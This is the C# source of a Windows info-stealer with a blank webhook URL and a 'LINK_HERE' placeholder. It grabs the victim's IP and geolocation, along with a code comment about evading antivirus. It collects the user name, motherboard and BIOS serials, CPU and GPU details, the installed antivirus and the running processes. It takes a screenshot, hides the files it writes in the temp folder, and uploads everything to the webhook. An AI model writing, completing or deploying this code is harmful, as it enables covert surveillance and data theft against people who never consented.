using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace testing1AVE
{
    class Program
    {
        private static readonly string webhook = "";
        static void Main(string[] args)
        {
            try
            {
                var iGlI = "";
                var mBd = "";
                var cpu = "";
                var gpu = "";
                var bios = "";
                var avN = "";

                // Start Of GeoLocation Grabber

                using (WebClient wc = new WebClient())
                {
                    string information = wc.DownloadString("LINK_HERE"); // User Unknown IP Grabber (Easy To Make) To Avoid AV Detections.
                    information = information.Replace("<br>", Environment.NewLine);
                    iGlI = information;
                    wc.Dispose();
                }

                // End Of GeoLocation Grabber

                // Start Of PC Information Grabber

                var cUser = "User: " + Environment.UserName;

                foreach (ManagementObject queryObj in new ManagementObjectSearcher(new SelectQuery("Win32_BaseBoard")).Get())
                {
                    mBd = "(MB) Serial Number: " + queryObj.Properties["SerialNumber"].Value.ToString();
                }

                foreach (ManagementObject managObj in new ManagementClass("win32_processor").GetInstances())
                {
                    cpu = "(CPU) Name: " + managObj.Properties["Name"].Value.ToString() + Environment.NewLine + "(CPU) Cores: " + managObj.Properties["NumberOfCores"].Value.ToString();
                }

                using (var searcher = new ManagementObjectSearcher("select * from Win32_VideoController"))
                {
                    foreach (ManagementObject managObj in searcher.Get())
                    {
                        gpu = "(GPU) Name: " + managObj.Properties["Name"].Value.ToString() + Environment.NewLine + "(GPU) Version: " + managObj.Properties["DriverVersion"].Value.ToString();
                    }
                    searcher.Dispose();
                }

                foreach (ManagementObject managObj in new ManagementClass("Win32_BIOS").GetInstances())
                {
                    bios = "Serial Number (BIOS): " + managObj.Properties["SerialNumber"].Value.ToString();
                }

                string pathS = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                using (var searcher = new ManagementObjectSearcher(pathS, "SELECT * FROM AntivirusProduct"))
                {
                    foreach (var instance in searcher.Get())
                    {
                        instance.GetPropertyValue("displayName");
                        avN = instance.GetPropertyValue("displayName").ToString();
                    }
                    if (avN == "") avN = "N/a";
                    searcher.Dispose();
                }

                // End Of PC Information Grabber

                // Start Of Current Proccess Activities

                var rP = "";
                foreach (Process proc in Process.GetProcesses())
                {
                    rP = rP + proc.ProcessName + Environment.NewLine;
                }

                if (!File.Exists(Path.GetTempPath() + "Proccesses.txt"))
                {
                    using (StreamWriter file = new StreamWriter(Path.GetTempPath() + "Proccesses.txt"))
                    {
                        file.WriteLine(rP);
                        file.Dispose();
                    }
                }
                else
                {
                    File.Delete(Path.GetTempPath() + "Proccesses.txt");
                    using (StreamWriter file = new StreamWriter(Path.GetTempPath() + "Proccesses.txt"))
                    {
                        file.WriteLine(rP);
                        file.Dispose();
                    }
                }

                var attr = File.GetAttributes(Path.GetTempPath() + "Proccesses.txt");
                if ((attr & FileAttributes.Hidden) != FileAttributes.Hidden)
                {
                    File.SetAttributes(Path.GetTempPath() + "Proccesses.txt", FileAttributes.Hidden);
                }

                // End Of Current Process Activities

                // Start Of Screenshot

                Rectangle b = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(b.Width, b.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, b.Size);
                        g.Dispose();
                    }
                    bitmap.Save(Path.GetTempPath() + "Screen.jpg", ImageFormat.Jpeg);
                    File.SetAttributes(Path.GetTempPath() + "Screen.jpg", FileAttributes.Hidden);
                    bitmap.Dispose();
                }

                // End Of Screenshot

                // Start Of Sending Information

                using (WebClient wc = new WebClient())
                {
                    wc.UploadValues(webhook, new System.Collections.Specialized.NameValueCollection()
                    {
                        {
                            "username",
                            "Logs"
                        },
                        {
                            "content",
                            $">>> -----GeoLocation Info-----{Environment.NewLine + iGlI + Environment.NewLine + Environment.NewLine}-----PC Info-----{Environment.NewLine + cUser + Environment.NewLine + mBd + Environment.NewLine + cpu + Environment.NewLine + gpu + Environment.NewLine + bios + Environment.NewLine + avN}"
                        }
                    });
                    wc.UploadFile(webhook, Path.GetTempPath() + "Proccesses.txt");
                    wc.UploadFile(webhook, Path.GetTempPath() + "Screen.jpg");
                    wc.Dispose();
                }

                // End Of Sending Information
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            Console.ReadLine();
        }
    }
}
